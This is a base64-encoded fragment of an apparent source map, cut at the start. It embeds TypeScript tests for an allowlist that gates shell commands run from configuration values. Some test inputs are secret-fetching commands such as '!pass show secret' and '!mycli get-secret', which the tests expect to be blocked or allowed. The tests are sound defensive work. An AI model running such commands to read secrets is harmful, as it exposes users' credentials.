IsICgpID0+IHtcblx0YWZ0ZXJFYWNoKCgpID0+IHtcblx0XHRzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzKFNBRkVfQ09NTUFORF9QUkVGSVhFUyk7XG5cdFx0Y2xlYXJDb25maWdWYWx1ZUNhY2hlKCk7XG5cdH0pO1xuXG5cdGl0KFwib3ZlcnJpZGVzIGJ1aWx0LWluIHByZWZpeGVzIHdpdGggY3VzdG9tIGxpc3RcIiwgKCkgPT4ge1xuXHRcdHNldEFsbG93ZWRDb21tYW5kUHJlZml4ZXMoW1wic29wc1wiLCBcImRvcHBsZXJcIl0pO1xuXHRcdGFzc2VydC5kZWVwRXF1YWwoWy4uLmdldEFsbG93ZWRDb21tYW5kUHJlZml4ZXMoKV0sIFtcInNvcHNcIiwgXCJkb3BwbGVyXCJdKTtcblx0fSk7XG5cblx0aXQoXCJjdXN0b20gcHJlZml4IGlzIGFsbG93ZWQgdGhyb3VnaCB0byBleGVjdXRpb25cIiwgKHQpID0+IHtcblx0XHRjb25zdCBzdGRlcnJDaHVua3M6IHN0cmluZ1tdID0gW107XG5cdFx0Y29uc3Qgb3JpZ2luYWxXcml0ZSA9IHByb2Nlc3Muc3RkZXJyLndyaXRlLmJpbmQocHJvY2Vzcy5zdGRlcnIpO1xuXHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gKGNodW5rOiBzdHJpbmcgfCBVaW50OEFycmF5LCAuLi5hcmdzOiB1bmtub3duW10pID0+IHtcblx0XHRcdHN0ZGVyckNodW5rcy5wdXNoKGNodW5rLnRvU3RyaW5nKCkpO1xuXHRcdFx0cmV0dXJuIHRydWU7XG5cdFx0fTtcblx0XHR0LmFmdGVyKCgpID0+IHtcblx0XHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gb3JpZ2luYWxXcml0ZTtcblx0XHR9KTtcblxuXHRcdHNldEFsbG93ZWRDb21tYW5kUHJlZml4ZXMoW1wibXljbGlcIl0pO1xuXHRcdHJlc29sdmVDb25maWdWYWx1ZShcIiFteWNsaSBnZXQtc2VjcmV0XCIpO1xuXHRcdGNvbnN0IGJsb2NrZWQgPSBzdGRlcnJDaHVua3Muc29tZSgobGluZSkgPT4gbGluZS5pbmNsdWRlcyhcIkJsb2NrZWQgZGlzYWxsb3dlZCBjb21tYW5kXCIpKTtcblx0XHRhc3NlcnQuZXF1YWwoYmxvY2tlZCwgZmFsc2UsIFwibXljbGkgc2hvdWxkIG5vdCBiZSBibG9ja2VkIHdoZW4gaW4gdGhlIGN1c3RvbSBhbGxvd2xpc3RcIik7XG5cdH0pO1xuXG5cdGl0KFwicHJldmlvdXNseS1hbGxvd2VkIHByZWZpeCBpcyBibG9ja2VkIGFmdGVyIG92ZXJyaWRlXCIsICh0KSA9PiB7XG5cdFx0Y29uc3Qgc3RkZXJyQ2h1bmtzOiBzdHJpbmdbXSA9IFtdO1xuXHRcdGNvbnN0IG9yaWdpbmFsV3JpdGUgPSBwcm9jZXNzLnN0ZGVyci53cml0ZS5iaW5kKHByb2Nlc3Muc3RkZXJyKTtcblx0XHRwcm9jZXNzLnN0ZGVyci53cml0ZSA9IChjaHVuazogc3RyaW5nIHwgVWludDhBcnJheSwgLi4uYXJnczogdW5rbm93bltdKSA9PiB7XG5cdFx0XHRzdGRlcnJDaHVua3MucHVzaChjaHVuay50b1N0cmluZygpKTtcblx0XHRcdHJldHVybiB0cnVlO1xuXHRcdH07XG5cdFx0dC5hZnRlcigoKSA9PiB7XG5cdFx0XHRwcm9jZXNzLnN0ZGVyci53cml0ZSA9IG9yaWdpbmFsV3JpdGU7XG5cdFx0fSk7XG5cblx0XHRzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzKFtcInNvcHNcIl0pO1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiFwYXNzIHNob3cgc2VjcmV0XCIpO1xuXHRcdGFzc2VydC5lcXVhbChyZXN1bHQsIHVuZGVmaW5lZCk7XG5cdFx0Y29uc3QgYmxvY2tlZCA9IHN0ZGVyckNodW5rcy5zb21lKChsaW5lKSA9PiBsaW5lLmluY2x1ZGVzKFwiQmxvY2tlZCBkaXNhbGxvd2VkIGNvbW1hbmRcIikpO1xuXHRcdGFzc2VydC5lcXVhbChibG9ja2VkLCB0cnVlLCBcInBhc3Mgc2hvdWxkIGJlIGJsb2NrZWQgd2hlbiBub3QgaW4gdGhlIGN1c3RvbSBhbGxvd2xpc3RcIik7XG5cdH0pO1xuXG5cdGl0KFwiY2xlYXJzIGNhY2hlIHdoZW4gb3ZlcnJpZGluZyBwcmVmaXhlc1wiLCAodCkgPT4ge1xuXHRcdGNvbnN0IHN0ZGVyckNodW5rczogc3RyaW5nW10gPSBbXTtcblx0XHRjb25zdCBvcmlnaW5hbFdyaXRlID0gcHJvY2Vzcy5zdGRlcnIud3JpdGUuYmluZChwcm9jZXNzLnN0ZGVycik7XG5cdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSAoY2h1bms6IHN0cmluZyB8IFVpbnQ4QXJyYXksIC4uLmFyZ3M6IHVua25vd25bXSkgPT4ge1xuXHRcdFx0c3RkZXJyQ2h1bmtzLnB1c2goY2h1bmsudG9TdHJpbmcoKSk7XG5cdFx0XHRyZXR1cm4gdHJ1ZTtcblx0XHR9O1xuXHRcdHQuYWZ0ZXIoKCkgPT4ge1xuXHRcdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSBvcmlnaW5hbFdyaXRlO1xuXHRcdH0pO1xuXG5cdFx0cmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIW15Y2xpIGdldC1zZWNyZXRcIik7XG5cdFx0YXNzZXJ0Lm9rKHN0ZGVyckNodW5rcy5zb21lKChsaW5lKSA9PiBsaW5lLmluY2x1ZGVzKFwiQmxvY2tlZFwiKSkpO1xuXG5cdFx0c3RkZXJyQ2h1bmtzLmxlbmd0aCA9IDA7XG5cblx0XHRzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzKFtcIm15Y2xpXCJdKTtcblx0XHRyZXNvbHZlQ29uZmlnVmFsdWUoXCIhbXljbGkgZ2V0LXNlY3JldFwiKTtcblx0XHRjb25zdCBibG9ja2VkID0gc3RkZXJyQ2h1bmtzLnNvbWUoKGxpbmUpID0+IGxpbmUuaW5jbHVkZXMoXCJCbG9ja2VkXCIpKTtcblx0XHRhc3NlcnQuZXF1YWwoYmxvY2tlZCwgZmFsc2UsIFwiU2hvdWxkIHJlLWV2YWx1YXRlIGFmdGVyIGFsbG93bGlzdCBjaGFuZ2VcIik7XG5cdH0pO1xufSk7XG4iXSwKICAibWFwcGluZ3MiOiAiQUFBQSxTQUFTLFVBQVUsSUFBSSxZQUFZLGlCQUFpQjtBQUNwRCxPQUFPLFlBQVk7QUFDbkI7QUFBQSxFQU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
